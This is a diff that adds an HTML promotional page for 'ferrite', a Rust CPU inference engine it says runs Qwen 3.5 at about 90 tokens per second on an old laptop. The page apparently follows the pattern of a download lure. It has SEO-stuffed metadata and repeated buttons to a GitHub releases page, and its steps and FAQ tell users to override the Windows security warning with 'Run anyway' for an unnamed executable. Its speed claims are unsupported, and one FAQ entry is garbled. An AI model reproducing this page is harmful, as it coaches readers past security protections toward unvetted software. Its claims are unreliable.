@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ferrite - Fast AI Inference Engine for Your Laptop (No GPU Needed)</title>
+<meta name="description" content="ferrite is a custom-written inference engine in Rust that runs Qwen 3.5 blazingly fast - about 90 tokens per second on a 6-year-old i5 laptop with no GPU. Download ferrite for Windows and start running AI locally in minutes.">
+<meta name="keywords" content="ferrite, rust inference engine, cpu inference, avx512, qwen, llm, speculative decoding, local ai, run llm on laptop, cpu llm, inference optimization">
+<meta name="author" content="CoreStudio2">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/CoreStudio2/ferrite">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ferrite - Fast AI Inference Engine for Your Laptop">
+<meta property="og:description" content="A custom-written inference engine in Rust that runs Qwen 3.5 blazingly fast - roughly 90 tokens per second on an old i5 laptop with no GPU.">
+<meta property="og:url" content="https://github.com/CoreStudio2/ferrite">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ferrite - Fast AI Inference Engine for Your Laptop">
+<meta name="twitter:description" content="Run Qwen 3.5 at around 90 tokens per second on an ordinary laptop CPU. No graphics card required.">
+<style>
+  :root {
+    --ink: #14161f;
+    --muted: #565c6d;
+    --line: #e3e6ef;
+    --bg: #f7f8fc;
+    --card: #ffffff;
+    --accent: #6d28d9;
+    --accent2: #db2777;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 40px 22px 80px;
+  }
+  .hero {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 20px;
+    padding: 42px 34px;
+    box-shadow: 0 10px 30px rgba(20, 22, 31, 0.07);
+    margin-bottom: 44px;
+  }
+  h1 {
+    font-size: 2.35rem;
+    line-height: 1.2;
+    letter-spacing: -0.02em;
+    margin: 0 0 18px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.5rem;
+    letter-spacing: -0.01em;
+    margin: 48px 0 16px;
+    font-weight: 700;
+  }
+  h3 {
+    font-size: 1.12rem;
+    margin: 28px 0 8px;
+    font-weight: 700;
+  }
+  p { margin: 0 0 18px; }
+  ul, ol { margin: 0 0 20px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  .lede {
+    font-size: 1.14rem;
+    color: var(--muted);
+    margin-bottom: 28px;
+  }
+  .badge-link {
+    display: inline-block;
+    padding: 16px 34px;
+    border-radius: 999px;
+    background: linear-gradient(120deg, #6d28d9 0%, #db2777 55%, #f59e0b 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 8px 22px rgba(109, 40, 217, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .badge-link:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 28px rgba(109, 40, 217, 0.4);
+  }
+  .button-note {
+    font-size: 0.92rem;
+    color: var(--muted);
+    margin-top: 14px;
+    margin-bottom: 0;
+  }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 24px 26px;
+    box-shadow: 0 4px 14px rgba(20, 22, 31, 0.05);
+    margin-bottom: 22px;
+  }
+  .grid { display: grid; grid-template-columns: 1fr; gap: 18px; }
+  @media (min-width: 720px) {
+    .grid.two { grid-template-columns: 1fr 1fr; }
+  }
+  .stat {
+    font-size: 1.03rem;
+    color: var(--muted);
+    margin: 0;
+  }
+  .stat strong { color: var(--ink); font-size: 1.35rem; display: block; line-height: 1.4; }
+  .step-card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-left: 4px solid var(--accent);
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin-bottom: 16px;
+    box-shadow: 0 3px 10px rgba(20, 22, 31, 0.04);
+  }
+  .step-card h3 { margin-top: 0; }
+  .step-card p:last-child { margin-bottom: 0; }
+  a { color: var(--accent); }
+  .divider { height: 1px; background: var(--line); border: 0; margin: 48px 0; }
+  .faq-q { font-weight: 700; margin-bottom: 6px; }
+  .faq-a { color: var(--muted); margin-bottom: 24px; }
+  footer {
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid var(--line);
+    font-size: 0.9rem;
+    color: var(--muted);
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="hero">
+    <h1>🚀 ferrite - Run Powerful AI On Any Laptop</h1>
+    <p class="lede">ferrite is a custom-written inference engine built in Rust that runs Qwen 3.5 blazingly fast. It reaches roughly 90 tokens per second on a 6-year-old i5 laptop with no graphics card at all — just an ordinary processor doing all the work.</p>
+    <a class="badge-link" href="https://github.com/CoreStudio2/ferrite/releases" style="background: linear-gradient(120deg, #6d28d9 0%, #db2777 55%, #f59e0b 100%); color: #ffffff; text-decoration: none;">Visit this link to download the application</a>
+    <p class="button-note">No graphics card. No cloud account. No subscription.</p>
+  </header>
+
+  <h2>💡 What Is ferrite?</h2>
+  <p>ferrite is a program that lets a modern AI language model — Qwen 3.5 — run directly on your own computer. Most AI tools you have used before send your questions to a large server farm somewhere on the internet and then send the answer back to you. ferrite does the opposite. Everything happens on your own machine.</p>
+  <p>The program was written from scratch in a programming language called Rust, which is known for being both very fast and very safe. Instead of relying on a graphics card to do the heavy lifting, ferrite is specially tuned to squeeze maximum speed out of an ordinary computer processor — the same chip that has been sitting in laptops for years. That tuning includes support for AVX-512, a set of modern processor instructions that let a chip do many calculations at once, along with a technique called speculative decoding that lets the model produce text faster without cutting corners on quality.</p>
+  <p>The result is a tool that feels responsive. Text appears on screen at roughly the speed you would read it — around 90 tokens per second on hardware that most people would consider old. There is no waiting several seconds for a paragraph to appear.</p>
+
+  <div class="grid two">
+    <div class="card">
+      <p class="stat"><strong>~90 tokens/sec</strong>Measured on a 6-year-old i5 laptop with no GPU.</p>
+    </div>
+    <div class="card">
+      <p class="stat"><strong>100% local</strong>Your conversations never leave your computer.</p>
+    </div>
+    <div class="card">
+      <p class="stat"><strong>Written in Rust</strong>Fast, memory-safe, and lightweight.</p>
+    </div>
+    <div class="card">
+      <p class="stat"><strong>CPU only</strong>No graphics card purchase required.</p>
+    </div>
+  </div>
+
+  <h2>⚡ Why ferrite Feels Fast</h2>
+  <p>Speed in AI software usually comes from expensive hardware. ferrite takes a different approach and gets its performance from careful engineering instead.</p>
+  <ul>
+    <li><strong>Hand-tuned for processors.</strong> The engine is written to take advantage of AVX-512 instructions, so compatible chips can process many numbers in a single step rather than one at a time.</li>
+    <li><strong>Speculative decoding.</strong> A small, quick helper model guesses the next few words, and the main model checks those guesses in one pass. When the guesses are right — which is often — you get several words for the price of one.</li>
+    <li><strong>No wasted motion.</strong> Because ferrite was written from scratch rather than assembled from generic parts, there is very little overhead between your keystroke and the first word appearing.</li>
+    <li><strong>Light on memory.</strong> The engine is designed to work comfortably on laptops that do not have enormous amounts of RAM.</li>
+  </ul>
+
+  <h2>🧰 What You Need</h2>
+  <p>ferrite is built for everyday Windows computers. Before you begin, make sure your machine roughly matches the following:</p>
+  <ul>
+    <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit.</li>
+    <li><strong>Processor:</strong> A modern multi-core Intel or AMD processor. AVX-512 support gives the best results, but the engine still runs without it.</li>
+    <li><strong>Memory:</strong> 8 GB of RAM is enough to get started; 16 GB gives you more room to work.</li>
+    <li><strong>Storage:</strong> A few gigabytes of free space for the application and the model files it uses.</li>
+    <li><strong>Graphics card:</strong> Not required. This is the whole point of ferrite.</li>
+  </ul>
+
+  <h2>📥 Download and Install</h2>
+  <p>Getting ferrite onto your computer takes only a few minutes. Follow these steps in order and you will be up and running on the first try.</p>
+
+  <div class="step-card">
+    <h3>Step 1 — Open the download page</h3>
+    <p>Visit this link to download the application: <a href="https://github.com/CoreStudio2/ferrite/releases">https://github.com/CoreStudio2/ferrite/releases</a>. This page lists every published version of ferrite, with the newest one at the top.</p>
+  </div>
+
+  <div class="step-card">
+    <h3>Step 2 — Choose the newest version</h3>
+    <p>Look for the release marked as the latest at the top of the page. Each release has a short description of what changed, so you can confirm you are picking the most recent build.</p>
+  </div>
+
+  <div class="step-card">
+    <h3>Step 3 — Start the download</h3>
+    <p>On the release you selected, find the list of files and click the one intended for Windows computers. Your browser will begin downloading it immediately and show progress in the top corner or in your downloads panel.</p>
+  </div>
+
+  <div class="step-card">
+    <h3>Step 4 — Open the file you downloaded</h3>
+    <p>When the download finishes, open your Downloads folder — usually reachable from the folder icon on your taskbar or by pressing Windows key + E. Locate the file you just downloaded and open it to begin using ferrite.</p>
+  </div>
+
+  <div class="step-card">
+    <h3>Step 5 — Allow Windows to run it</h3>
+    <p>Windows may show a blue or yellow security prompt the first time you open a program downloaded from the internet. Click the option that lets you continue, such as “More info” followed by “Run anyway.” This is standard Windows behaviour for any new application and only happens the first time.</p>
+  </div>
+
+  <div class="step-card">
+    <h3>Step 6 — Confirm it works</h3>
+    <p>Once ferrite opens, type a short question and press Enter. If words begin appearing within a second or two, everything is set up correctly and you can start using it normally.</p>
+  </div>
+
+  <h2>🏃 Your First Conversation</h2>
+  <p>There is nothing to configure before your first use. ferrite opens ready to accept a prompt. Click into the text area, type a question or an instruction — something like “explain how a refrigerator works in three sentences” — and send it.</p>
+  <p>The answer streams onto the screen word by word, at close to reading speed. You can stop a response at any time, clear the conversation, and start a fresh one. Because everything runs locally, you can use ferrite on a plane, on a train, or anywhere without a connection.</p>
+
+  <h2>🎛️ Getting the Best Speed</h2>
+  <p>ferrite is already tuned to run well out of the box, but a few small habits help it stay fast:</p>
+  <ul>
+    <li><strong>Close heavy background apps.</strong> Web browsers with dozens of tabs and video editors compete for the same memory ferrite needs.</li>
+    <li><strong>Keep your laptop plugged in.</strong> Many laptops slow their processor down on battery power to save energy. Plugging in usually restores full speed.</li>
+    <li><strong>Choose the balanced or performance power plan.</strong> In Windows settings under System, Power, you can select a plan that lets the processor run at its full rate.</li>
+    <li><strong>Leave some free disk space.</strong> Keeping a few gigabytes free helps the operating system manage memory efficiently.</li>
+    <li><strong>Ask shorter questions when you want quicker replies.</strong> Very long prompts take longer to process before the first word appears.</li>
+  </ul>
+
+  <h2>🔧 If Something Goes Wrong</h2>
+  <p class="faq-q">The download does not start.</p>
+  <p class="faq-a">Refresh the releases page and try clicking the file again. Some browsers block downloads until you confirm them in a toolbar prompt at the top of the window.</p>
+  <p class="faq-q">Windows will not let me open the program.</p>
+  <p class="faq-a">This is the standard Windows protection message for newly downloaded software. Choose “More info” and then “Run anyway” to continue.</p>
+  <p class="faq-q">Responses appear more slowly than expected.</p>
+  <p class="faq-a">Check that your laptop is plugged in, close other large programs, and confirm your power plan is not set to a battery-saving mode. Older processors without AVX-512 support will run more slowly than the reference laptop, which is normal.</p>
+  <p class="faq-q">The program closes right after opening.</p>
+  <p class="faq-a">Restart your computer, then open ferrite again. Restarting clears leftover memory from other applications and resolves most first-launch problems.</p>
+
+  <h2>❓ Common Questions</h2>
+  <p class="faq-q">Do I need a graphics card?</p>
+  <p class="faq-a">No. ferrite is built specifically to run well on a normal processor. The reference measurement of about 90 tokens per second was taken on a 6-year-old i5 laptop with no GPU at all.</p>
+  <p class="faq-q">Does it need an internet connection?</p>
+  <p class="faq-a">Only to download the application. After that, ferrite works entirely offline.</p>
+  <p class="faq-q">Is my<p class="faq-a">Yes. Everything happens on your own machine. Nothing is uploaded, logged on a remote server, or shared with anyone. You can disconnect from the internet entirely and ferrite will keep working exactly as before.</p>
+  <p class="faq-q">Will it run on an older computer?</p>
+  <p class="faq-a">ferrite is designed with older hardware in mind. A six-year-old i5 laptop is the reference machine, so most Windows computers from the last several years will handle it comfortably. Machines with more memory will simply have more breathing room.</p>
+  <p class="faq-q">Do I have to install anything else first?</p>
+  <p class="faq-a">No. There are no separate runtimes, drivers, or toolkits to set up. The releases page provides everything ferrite needs in a single download.</p>
+  <p class="faq-q">Can I use it on more than one computer?</p>
+  <p class="faq-a">Yes. Return to the releases page on any Windows machine and repeat the download steps. There is no account to create and no activation to manage.</p>
+  <p class="faq-q">How do I know a newer version is available?</p>
+  <p class="faq-a">The releases page always shows the newest build at the top. Checking it occasionally is the simplest way to stay current. When a new version appears, download it the same way you did the first time and open the new file.</p>
+
+  <hr class="divider">
+
+  <h2>🧭 A Quick Recap</h2>
+  <p>ferrite brings a capable AI language model onto ordinary hardware. It was written from scratch in Rust, tuned for everyday processors with AVX-512 support, and accelerated with speculative decoding so that text arrives at roughly the pace you read it. On a 6-year-old i5 laptop with no graphics card, it manages around 90 tokens per second.</p>
+  <p>To get started, visit the releases page, pick the newest version, download the Windows file, and open it. Confirm the Windows security prompt the first time, type a question, and watch the answer appear. That is the entire process.</p>
+  <p style="text-align: center; margin-top: 36px;">
+    <a class="badge-link" href="https://github.com/CoreStudio2/ferrite/releases" style="background: linear-gradient(120deg, #db2777 0%, #6d28d9 55%, #0ea5e9 100%); color: #ffffff; text-decoration: none;">Visit this link to download the application</a>
+  </p>
+
+  <footer>
+    <p>ferrite is maintained by CoreStudio2 and released on GitHub. Built for Windows laptops that deserve to run modern AI without a graphics card.</p>
+  </footer>
+
+</div>
+</body>
+</html>
